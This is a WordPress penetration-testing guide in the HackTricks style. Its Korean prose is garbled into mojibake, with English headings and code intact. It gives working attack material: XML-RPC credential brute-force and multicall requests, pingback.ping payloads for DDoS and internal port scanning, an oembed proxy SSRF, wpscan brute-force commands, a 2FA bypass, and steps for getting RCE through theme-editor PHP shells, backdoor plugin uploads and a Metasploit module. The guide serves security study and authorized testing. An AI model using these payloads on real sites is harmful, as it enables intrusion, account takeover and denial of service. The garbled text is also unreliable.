# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## ê¸°ë³¸ ì •ë³´

- **ì—…ë¡œë“œëœ** íŒŒì¼ì€: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **í…Œë§ˆ íŒŒì¼ì€ /wp-content/themes/ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤,** ë”°ë¼ì„œ í…Œë§ˆì˜ ì¼ë¶€ phpë¥¼ ìˆ˜ì •í•˜ì—¬ RCEë¥¼ ì–»ìœ¼ë ¤ë©´ ì•„ë§ˆ ê·¸ ê²½ë¡œë¥¼ ì‚¬ìš©í•  ê²ƒì…ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´: **theme twentytwelve**ë¥¼ ì‚¬ìš©í•˜ë©´ ë‹¤ìŒì—ì„œ **404.php** íŒŒì¼ì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **ë˜ ë‹¤ë¥¸ ìœ ìš©í•œ URL ì˜ˆì‹œ:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- `wp-config.php`ì—ì„œ ë°ì´í„°ë² ì´ìŠ¤ì˜ ë£¨íŠ¸ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
- í™•ì¸í•  ê¸°ë³¸ ë¡œê·¸ì¸ ê²½ë¡œ: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Main WordPress Files**

- `index.php`
- `license.txt`ì—ëŠ” ì„¤ì¹˜ëœ WordPress ë²„ì „ê³¼ ê°™ì€ ìœ ìš©í•œ ì •ë³´ê°€ í¬í•¨ë˜ì–´ ìˆìŠµë‹ˆë‹¤.
- `wp-activate.php`ëŠ” ìƒˆ WordPress ì‚¬ì´íŠ¸ë¥¼ ì„¤ì •í•  ë•Œ ì´ë©”ì¼ í™œì„±í™” ê³¼ì •ì— ì‚¬ìš©ë©ë‹ˆë‹¤.
- ë¡œê·¸ì¸ í´ë”(ìˆ¨ê¸°ê¸° ìœ„í•´ ì´ë¦„ì´ ë°”ë€Œì–´ ìˆì„ ìˆ˜ ìˆìŒ):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php`ëŠ” HTTPë¥¼ ì „ì†¡ ë©”ì»¤ë‹ˆì¦˜ìœ¼ë¡œ, XMLì„ ì¸ì½”ë”© ë©”ì»¤ë‹ˆì¦˜ìœ¼ë¡œ ì‚¬ìš©í•˜ì—¬ ë°ì´í„°ë¥¼ ì „ì†¡í•  ìˆ˜ ìˆê²Œ í•˜ëŠ” WordPressì˜ ê¸°ëŠ¥ì„ ë‚˜íƒ€ë‚´ëŠ” íŒŒì¼ì…ë‹ˆë‹¤. ì´ëŸ¬í•œ ìœ í˜•ì˜ í†µì‹ ì€ WordPressì˜ [REST API](https://developer.wordpress.org/rest-api/reference)ë¡œ ëŒ€ì²´ë˜ì—ˆìŠµë‹ˆë‹¤.
- `wp-content` í´ë”ëŠ” í”ŒëŸ¬ê·¸ì¸ê³¼ í…Œë§ˆê°€ ì €ì¥ë˜ëŠ” ì£¼ìš” ë””ë ‰í„°ë¦¬ì…ë‹ˆë‹¤.
- `wp-content/uploads/`ëŠ” í”Œë«í¼ì— ì—…ë¡œë“œëœ ëª¨ë“  íŒŒì¼ì´ ì €ì¥ë˜ëŠ” ë””ë ‰í„°ë¦¬ì…ë‹ˆë‹¤.
- `wp-includes/`ëŠ” ì¸ì¦ì„œ, í°íŠ¸, JavaScript íŒŒì¼ ë° ìœ„ì ¯ê³¼ ê°™ì€ í•µì‹¬ íŒŒì¼ì´ ì €ì¥ë˜ëŠ” ë””ë ‰í„°ë¦¬ì…ë‹ˆë‹¤.
- `wp-sitemap.xml` WordPress ë²„ì „ 5.5 ì´ìƒì—ì„œëŠ” ê³µê°œ ê²Œì‹œë¬¼ê³¼ ê³µê°œì ìœ¼ë¡œ ì¿¼ë¦¬ ê°€ëŠ¥í•œ í¬ìŠ¤íŠ¸ íƒ€ì… ë° ë¶„ë¥˜ë¥¼ í¬í•¨í•œ sitemap XML íŒŒì¼ì„ ìƒì„±í•©ë‹ˆë‹¤.

**Post exploitation**

- `wp-config.php` íŒŒì¼ì—ëŠ” ë°ì´í„°ë² ì´ìŠ¤ ì´ë¦„, ë°ì´í„°ë² ì´ìŠ¤ í˜¸ìŠ¤íŠ¸, ì‚¬ìš©ìëª…ê³¼ ë¹„ë°€ë²ˆí˜¸, ì¸ì¦ í‚¤ì™€ ì†”íŠ¸, ë°ì´í„°ë² ì´ìŠ¤ í…Œì´ë¸” ì ‘ë‘ì‚¬ ë“± WordPressê°€ ë°ì´í„°ë² ì´ìŠ¤ì— ì—°ê²°í•˜ëŠ” ë° í•„ìš”í•œ ì •ë³´ê°€ í¬í•¨ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ì´ êµ¬ì„± íŒŒì¼ì€ DEBUG ëª¨ë“œë¥¼ í™œì„±í™”í•˜ëŠ” ë°ì—ë„ ì‚¬ìš©ë  ìˆ˜ ìˆìœ¼ë©°, ë¬¸ì œ í•´ê²°ì— ìœ ìš©í•©ë‹ˆë‹¤.

### ì‚¬ìš©ì ê¶Œí•œ

- **Administrator**
- **Editor**: ìì‹ ì˜ ê²Œì‹œë¬¼ê³¼ ë‹¤ë¥¸ ì‚¬ëŒì˜ ê²Œì‹œë¬¼ì„ ê²Œì‹œí•˜ê³  ê´€ë¦¬í•©ë‹ˆë‹¤
- **Author**: ìì‹ ì˜ ê²Œì‹œë¬¼ì„ ê²Œì‹œí•˜ê³  ê´€ë¦¬í•©ë‹ˆë‹¤
- **Contributor**: ìì‹ ì˜ ê²Œì‹œë¬¼ì„ ì‘ì„±í•˜ê³  ê´€ë¦¬í•˜ì§€ë§Œ ê²Œì‹œí•  ìˆ˜ëŠ” ì—†ìŠµë‹ˆë‹¤
- **Subscriber**: ê²Œì‹œë¬¼ì„ ì—´ëŒí•˜ê³  ìì‹ ì˜ í”„ë¡œí•„ì„ í¸ì§‘í•©ë‹ˆë‹¤

## **Passive Enumeration**

### **Get WordPress version**

`/license.txt` ë˜ëŠ” `/readme.html` íŒŒì¼ì„ ì°¾ì„ ìˆ˜ ìˆëŠ”ì§€ í™•ì¸í•˜ì„¸ìš”.

í˜ì´ì§€ì˜ **ì†ŒìŠ¤ ì½”ë“œ** ë‚´ë¶€ì—ì„œ (ì˜ˆ: [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS ë§í¬ íŒŒì¼

![](<../../images/image (533).png>)

- JavaScript íŒŒì¼

![](<../../images/image (524).png>)

### í”ŒëŸ¬ê·¸ì¸ ê°€ì ¸ì˜¤ê¸°
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### í…Œë§ˆ ê°€ì ¸ì˜¤ê¸°
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### ì¼ë°˜ì ìœ¼ë¡œ ë²„ì „ ì¶”ì¶œ
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Active enumeration

### Plugins and Themes

ëª¨ë“  Plugins and Themesë¥¼ ì°¾ì§€ ëª»í•  ê°€ëŠ¥ì„±ì´ ë†’ìŠµë‹ˆë‹¤. ëª¨ë‘ ì°¾ì•„ë‚´ê¸° ìœ„í•´ì„œëŠ” **actively Brute Force a list of Plugins and Themes** í•´ì•¼ í•©ë‹ˆë‹¤(ìš´ ì¢‹ê²Œë„ ì´ëŸ¬í•œ ëª©ë¡ì„ í¬í•¨í•œ ìë™í™” ë„êµ¬ë“¤ì´ ìˆìŠµë‹ˆë‹¤).

### Users

- **ID Brute:** WordPress ì‚¬ì´íŠ¸ì—ì„œ ì‚¬ìš©ì IDë¥¼ Brute Forcingí•˜ì—¬ ìœ íš¨í•œ ì‚¬ìš©ìë¥¼ ì–»ìŠµë‹ˆë‹¤:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
ì‘ë‹µì´ **200** ë˜ëŠ” **30X**ì´ë©´ í•´ë‹¹ idëŠ” **ìœ íš¨**ì…ë‹ˆë‹¤. ì‘ë‹µì´ **400**ì´ë©´ idëŠ” **ë¬´íš¨**ì…ë‹ˆë‹¤.

- **wp-json:** ì¿¼ë¦¬í•˜ì—¬ ì‚¬ìš©ìì— ëŒ€í•œ ì •ë³´ë¥¼ ì–»ì–´ë³¼ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
ì‚¬ìš©ìì— ëŒ€í•œ ì¼ë¶€ ì •ë³´ë¥¼ ë…¸ì¶œí•  ìˆ˜ ìˆëŠ” ë˜ ë‹¤ë¥¸ `/wp-json/` endpointëŠ”:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Note that this endpoint only exposes users that have made a post. **ì´ ê¸°ëŠ¥ì´ í™œì„±í™”ëœ ì‚¬ìš©ìì— ëŒ€í•œ ì •ë³´ë§Œ ì œê³µë©ë‹ˆë‹¤**

Also note that **/wp-json/wp/v2/pages** could leak IP addresses.

- **Login username enumeration**: **`/wp-login.php`**ì— ë¡œê·¸ì¸í•  ë•Œ **ë©”ì‹œì§€**ê°€ í•´ë‹¹ **ì‚¬ìš©ì ì´ë¦„ì˜ ì¡´ì¬ ì—¬ë¶€**ì— ë”°ë¼ **ë‹¤ë¦…ë‹ˆë‹¤**.

### XML-RPC

`xml-rpc.php`ê°€ í™œì„±í™”ë˜ì–´ ìˆìœ¼ë©´ credentials brute-forceë¥¼ ìˆ˜í–‰í•˜ê±°ë‚˜ ë‹¤ë¥¸ ë¦¬ì†ŒìŠ¤ì— DoS ê³µê²©ì„ ì‹¤í–‰í•˜ëŠ” ë° ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. (You can automate this process[ using this](https://github.com/relarizky/wpxploit) for example).

í™œì„±í™” ì—¬ë¶€ë¥¼ í™•ì¸í•˜ë ¤ë©´ _**/xmlrpc.php**_ì— ì ‘ê·¼í•˜ì—¬ ë‹¤ìŒ ìš”ì²­ì„ ì „ì†¡í•´ë³´ì„¸ìš”:

**í™•ì¸**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** or **`metaWeblog.getUsersBlogs`**ëŠ” credentialsë¥¼ brute-forceí•˜ëŠ” ë° ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” ëª‡ ê°€ì§€ ë©”ì„œë“œì…ë‹ˆë‹¤. ì´ë“¤ ì¤‘ ì–´ëŠ í•˜ë‚˜ë¥¼ ì°¾ì„ ìˆ˜ ìˆë‹¤ë©´ ë‹¤ìŒê³¼ ê°™ì€ ìš”ì²­ì„ ë³´ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
ìê²© ì¦ëª…ì´ ì˜¬ë°”ë¥´ì§€ ì•Šìœ¼ë©´ 200 ì‘ë‹µ ì½”ë“œ ë‚´ì— ìˆëŠ” _"Incorrect username or password"_ ë©”ì‹œì§€ê°€ í‘œì‹œë˜ì–´ì•¼ í•©ë‹ˆë‹¤.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

ì˜¬ë°”ë¥¸ ìê²© ì¦ëª…ì„ ì‚¬ìš©í•˜ë©´ íŒŒì¼ì„ ì—…ë¡œë“œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì‘ë‹µì—ì„œ ê²½ë¡œê°€ í‘œì‹œë©ë‹ˆë‹¤ ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
ë˜í•œ ê°™ì€ ìš”ì²­ì—ì„œ ì—¬ëŸ¬ credentialsë¥¼ ì‹œë„í•  ìˆ˜ ìˆìœ¼ë¯€ë¡œ **`system.multicall`**ì„ ì‚¬ìš©í•´ credentialsë¥¼ brute-forceí•˜ëŠ” **ë” ë¹ ë¥¸ ë°©ë²•**ì´ ìˆìŠµë‹ˆë‹¤:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

ì´ ë°©ë²•ì€ í”„ë¡œê·¸ë¨ìš©(ì‚¬ëŒìš©ì´ ì•„ë‹ˆë©°)ìœ¼ë¡œ ë§Œë“¤ì–´ì¡Œê³  ì˜¤ë˜ë˜ì–´ 2FAë¥¼ ì§€ì›í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ìœ íš¨í•œ credsë¥¼ ê°€ì§€ê³  ìˆì§€ë§Œ ë©”ì¸ ì§„ì…ì´ 2FAë¡œ ë³´í˜¸ë˜ì–´ ìˆë‹¤ë©´, **xmlrpc.phpë¥¼ ì•…ìš©í•´ í•´ë‹¹ credsë¡œ 2FAë¥¼ ìš°íšŒí•˜ì—¬ ë¡œê·¸ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**. ì½˜ì†”ì—ì„œ í•  ìˆ˜ ìˆëŠ” ëª¨ë“  ì‘ì—…ì„ ìˆ˜í–‰í•  ìˆ˜ëŠ” ì—†ì§€ë§Œ, Ippsecê°€ [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)ì—ì„œ ì„¤ëª…í•˜ëŠ” ê²ƒì²˜ëŸ¼ ì—¬ì „íˆ RCEì— ë„ë‹¬í•  ìˆ˜ ìˆì„ì§€ë„ ëª¨ë¦…ë‹ˆë‹¤.

**DDoS or port scanning**

ëª©ë¡ì—ì„œ _**pingback.ping**_ ë©”ì„œë“œë¥¼ ì°¾ì„ ìˆ˜ ìˆë‹¤ë©´ Wordpressê°€ ì„ì˜ì˜ í˜¸ìŠ¤íŠ¸/í¬íŠ¸ë¡œ ìš”ì²­ì„ ë³´ë‚´ê²Œ ë§Œë“¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤.\ ì´ ê¸°ëŠ¥ì„ ì´ìš©í•˜ë©´ **ìˆ˜ì²œ ê°œ**ì˜ **Wordpress** **ì‚¬ì´íŠ¸**ê°€ í•˜ë‚˜ì˜ **ìœ„ì¹˜**ì— **ì ‘ê·¼**í•˜ë„ë¡ ìš”ì²­í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤(ë”°ë¼ì„œ í•´ë‹¹ **location**ì—ì„œ **DDoS**ê°€ ë°œìƒí•©ë‹ˆë‹¤) ë˜ëŠ” **Wordpress**ë¥¼ ì´ìš©í•´ ë‚´ë¶€ **ë„¤íŠ¸ì›Œí¬**ì˜ ì¼ë¶€ë¥¼ **ìŠ¤ìº”**í•˜ê²Œ ë§Œë“¤ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤(ì„ì˜ì˜ í¬íŠ¸ë¥¼ ì§€ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

**faultCode**ì˜ ê°’ì´ **0** (17)ë³´ë‹¤ **í°** ê²½ìš° í¬íŠ¸ê°€ ì—´ë ¤ ìˆë‹¤ëŠ” ì˜ë¯¸ì…ë‹ˆë‹¤.

ì´ì „ ì„¹ì…˜ì—ì„œ **`system.multicall`**ì˜ ì‚¬ìš©ì„ í™•ì¸í•˜ì—¬ ì´ ë©”ì„œë“œë¥¼ ì•…ìš©í•´ DDoSë¥¼ ìœ ë°œí•˜ëŠ” ë°©ë²•ì„ ì•Œì•„ë³´ì„¸ìš”.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

ì´ íŒŒì¼ì€ ì¼ë°˜ì ìœ¼ë¡œ Wordpress ì‚¬ì´íŠ¸ì˜ ë£¨íŠ¸ì— ì¡´ì¬í•©ë‹ˆë‹¤: **`/wp-cron.php`**\
ì´ íŒŒì¼ì— **ì ‘ê·¼**í•˜ë©´ "**heavy**" MySQL **query**ê°€ ìˆ˜í–‰ë˜ì–´ **attackers**ê°€ **DoS**ë¥¼ **ìœ ë°œ**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ë˜í•œ ê¸°ë³¸ì ìœ¼ë¡œ `wp-cron.php`ëŠ” ëª¨ë“  í˜ì´ì§€ ë¡œë“œ(í´ë¼ì´ì–¸íŠ¸ê°€ Wordpress í˜ì´ì§€ë¥¼ ìš”ì²­í•  ë•Œë§ˆë‹¤)ë§ˆë‹¤ í˜¸ì¶œë˜ë©°, íŠ¸ë˜í”½ì´ ë§ì€ ì‚¬ì´íŠ¸ì—ì„œëŠ” ë¬¸ì œê°€ ìƒê¸¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤ (DoS).

Wp-Cronì„ ë¹„í™œì„±í™”í•˜ê³  í˜¸ìŠ¤íŠ¸ ë‚´ì—ì„œ ì‹¤ì œ cronjobì„ ìƒì„±í•˜ì—¬ í•„ìš”í•œ ì‘ì—…ì„ ì •ê¸°ì ìœ¼ë¡œ ìˆ˜í–‰í•˜ë„ë¡ ì„¤ì •í•˜ëŠ” ê²ƒì´ ê¶Œì¥ë©ë‹ˆë‹¤ (ë¬¸ì œ ì—†ì´).

### /wp-json/oembed/1.0/proxy - SSRF

ë‹¤ìŒ URLì— ì ‘ê·¼í•´ë³´ì„¸ìš”: _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ ê·¸ë¦¬ê³  Worpress ì‚¬ì´íŠ¸ê°€ ê·€í•˜ì—ê²Œ ìš”ì²­ì„ ë³´ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

ì´ ë„êµ¬ëŠ” **methodName: pingback.ping** ë° ê²½ë¡œ **/wp-json/oembed/1.0/proxy**ì˜ ì¡´ì¬ë¥¼ í™•ì¸í•˜ê³ , ì¡´ì¬í•˜ë©´ ì´ë¥¼ exploití•˜ë ¤ê³  ì‹œë„í•©ë‹ˆë‹¤.

## ìë™í™” ë„êµ¬
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## ë¹„íŠ¸ë¥¼ ë®ì–´ì¨ì„œ ì ‘ê·¼ ì–»ê¸°

ì‹¤ì œ ê³µê²©ì´ë¼ê¸°ë³´ë‹¤ í˜¸ê¸°ì‹¬ì— ê°€ê¹ë‹¤. CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man)ì—ì„œ ì„ì˜ì˜ wordpress íŒŒì¼ì˜ 1 bitë¥¼ ë’¤ì§‘ì„ ìˆ˜ ìˆì—ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´ íŒŒì¼ `/var/www/html/wp-includes/user.php`ì˜ ìœ„ì¹˜ `5389`ë¥¼ ë’¤ì§‘ì–´ NOT (`!`) ì—°ì‚°ì„ NOP ì²˜ë¦¬í•  ìˆ˜ ìˆë‹¤.
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **íŒ¨ë„ RCE**

**ì‚¬ìš© ì¤‘ì¸ í…Œë§ˆì˜ php ìˆ˜ì • (admin credentials needed)**

Appearance â†’ Theme Editor â†’ 404 Template (ì˜¤ë¥¸ìª½)

php shellë¡œ ë‚´ìš©ì„ ë³€ê²½:

![](<../../images/image (384).png>)

ì—…ë°ì´íŠ¸ëœ í˜ì´ì§€ì— ì–´ë–»ê²Œ ì ‘ê·¼í•˜ëŠ”ì§€ ì¸í„°ë„·ì—ì„œ ê²€ìƒ‰í•˜ì„¸ìš”. ì´ ê²½ìš° ë‹¤ìŒ URLì— ì ‘ê·¼í•´ì•¼ í•©ë‹ˆë‹¤: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
ì„¸ì…˜ì„ ì–»ê¸° ìœ„í•´.

## í”ŒëŸ¬ê·¸ì¸ RCE

### PHP í”ŒëŸ¬ê·¸ì¸

.php íŒŒì¼ì„ í”ŒëŸ¬ê·¸ì¸ìœ¼ë¡œ ì—…ë¡œë“œí•  ìˆ˜ ìˆëŠ” ê²½ìš°ê°€ ìˆìŠµë‹ˆë‹¤.\
ì˜ˆë¥¼ ë“¤ì–´ ë‹¤ìŒê³¼ ê°™ì´ php ë°±ë„ì–´ë¥¼ ìƒì„±í•˜ì„¸ìš”:

![](<../../images/image (183).png>)

ê·¸ëŸ° ë‹¤ìŒ ìƒˆ í”ŒëŸ¬ê·¸ì¸ì„ ì¶”ê°€í•˜ì„¸ìš”:

![](<../../images/image (722).png>)

í”ŒëŸ¬ê·¸ì¸ì„ ì—…ë¡œë“œí•œ í›„ Install Nowë¥¼ ëˆ„ë¥´ì„¸ìš”:

![](<../../images/image (249).png>)

Proccedë¥¼ í´ë¦­í•˜ì„¸ìš”:

![](<../../images/image (70).png>)

ì•„ë§ˆ ì•„ë¬´ëŸ° ë³€í™”ê°€ ì—†ì„ ìˆ˜ ìˆì§€ë§Œ, Mediaë¡œ ì´ë™í•˜ë©´ ì—…ë¡œë“œëœ ì…¸ì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

![](<../../images/image (462).png>)

ì ‘ì†í•˜ë©´ reverse shellì„ ì‹¤í–‰í•  URLì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

ì´ ë°©ë²•ì€ ì·¨ì•½í•œ ê²ƒìœ¼ë¡œ ì•Œë ¤ì§„ ì•…ì„± í”ŒëŸ¬ê·¸ì¸ì„ ì„¤ì¹˜í•˜ì—¬ web shellì„ ì–»ì„ ìˆ˜ ìˆê²Œ í•˜ëŠ” ë°©ì‹ì…ë‹ˆë‹¤. ì´ ê³¼ì •ì€ WordPress ëŒ€ì‹œë³´ë“œë¥¼ í†µí•´ ë‹¤ìŒê³¼ ê°™ì´ ìˆ˜í–‰ë©ë‹ˆë‹¤:

1. **Plugin Acquisition**: í”ŒëŸ¬ê·¸ì¸ì€ Exploit DBì™€ ê°™ì€ ì†ŒìŠ¤ì—ì„œ íšë“í•©ë‹ˆë‹¤(ì˜ˆ: [**here**](https://www.exploit-db.com/exploits/36374)).
2. **Plugin Installation**:
- WordPress ëŒ€ì‹œë³´ë“œë¡œ ì´ë™í•œ ë‹¤ìŒ `Dashboard > Plugins > Upload Plugin`ë¡œ ì´ë™í•©ë‹ˆë‹¤.
- ë‹¤ìš´ë¡œë“œí•œ í”ŒëŸ¬ê·¸ì¸ì˜ zip íŒŒì¼ì„ ì—…ë¡œë“œí•©ë‹ˆë‹¤.
3. **Plugin Activation**: í”ŒëŸ¬ê·¸ì¸ì´ ì„±ê³µì ìœ¼ë¡œ ì„¤ì¹˜ë˜ë©´ ëŒ€ì‹œë³´ë“œì—ì„œ í™œì„±í™”í•´ì•¼ í•©ë‹ˆë‹¤.
4. **Exploitation**:
- reflex-gallery í”ŒëŸ¬ê·¸ì¸ì´ ì„¤ì¹˜ë˜ê³  í™œì„±í™”ëœ ìƒíƒœì—ì„œ ì·¨ì•½ì ì´ ì•Œë ¤ì ¸ ìˆì–´ ì•…ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
- Metasploit frameworkëŠ” ì´ ì·¨ì•½ì ì— ëŒ€í•œ exploitë¥¼ ì œê³µí•©ë‹ˆë‹¤. ì ì ˆí•œ ëª¨ë“ˆì„ ë¡œë“œí•˜ê³  íŠ¹ì • ëª…ë ¹ì„ ì‹¤í–‰í•˜ë©´ meterpreter ì„¸ì…˜ì„ ìˆ˜ë¦½í•´ ì‚¬ì´íŠ¸ì— ë¬´ë‹¨ ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
- ì´ëŠ” WordPress ì‚¬ì´íŠ¸ë¥¼ exploití•˜ëŠ” ì—¬ëŸ¬ ë°©ë²• ì¤‘ í•˜ë‚˜ì¼ ë¿ì…ë‹ˆë‹¤.

ì´ ë‚´ìš©ì€ í”ŒëŸ¬ê·¸ì¸ ì„¤ì¹˜ ë° í™œì„±í™” ë‹¨ê³„ë¥¼ ë³´ì—¬ì£¼ëŠ” ì‹œê°ì  ìë£Œë¥¼ í¬í•¨í•©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ì ì ˆí•œ í—ˆê°€ ì—†ì´ ì´ëŸ¬í•œ ë°©ì‹ìœ¼ë¡œ ì·¨ì•½ì ì„ exploití•˜ëŠ” ê²ƒì€ ë¶ˆë²•ì´ë©° ë¹„ìœ¤ë¦¬ì ì„ì„ ëª…ì‹¬í•´ì•¼ í•©ë‹ˆë‹¤. ì´ ì •ë³´ëŠ” ì±…ì„ê° ìˆê²Œ, ì˜ˆì»¨ëŒ€ ëª…ì‹œì  í—ˆê°€ë¥¼ ë°›ì€ penetration testing ê°™ì€ í•©ë²•ì ì¸ ìƒí™©ì—ì„œë§Œ ì‚¬ìš©í•´ì•¼ í•©ë‹ˆë‹¤.

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## XSSì—ì„œ RCEë¡œ

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ ëŠ” WordPressì—ì„œ **Cross-Site Scripting (XSS)** ì·¨ì•½ì ì„ **Remote Code Execution (RCE)** ë˜ëŠ” ê¸°íƒ€ ì‹¬ê°í•œ ì·¨ì•½ì ìœ¼ë¡œ ìƒìŠ¹ì‹œí‚¤ë„ë¡ ì„¤ê³„ëœ ìŠ¤í¬ë¦½íŠ¸ì…ë‹ˆë‹¤. ìì„¸í•œ ë‚´ìš©ì€ [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html)ë¥¼ í™•ì¸í•˜ì„¸ìš”. ë‹¤ìŒì„ ì§€ì›í•©ë‹ˆë‹¤:
- _**Privilege Escalation:**_ WordPressì— ì‚¬ìš©ìë¥¼ ìƒì„±í•©ë‹ˆë‹¤.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ ì‚¬ìš©ì ì§€ì • í”ŒëŸ¬ê·¸ì¸(backdoor)ì„ WordPressì— ì—…ë¡œë“œí•©ë‹ˆë‹¤.
- _**(RCE) Built-In Plugin Edit:**_ WordPressì˜ ë‚´ì¥ í”ŒëŸ¬ê·¸ì¸ì„ ìˆ˜ì •í•©ë‹ˆë‹¤.
- _**(RCE) Built-In Theme Edit:**_ WordPressì˜ ë‚´ì¥ í…Œë§ˆë¥¼ ìˆ˜ì •í•©ë‹ˆë‹¤.
- _**(Custom) Custom Exploits:**_ íƒ€ì‚¬ WordPress í”ŒëŸ¬ê·¸ì¸/í…Œë§ˆë¥¼ ìœ„í•œ Custom Exploits.

## Post Exploitation

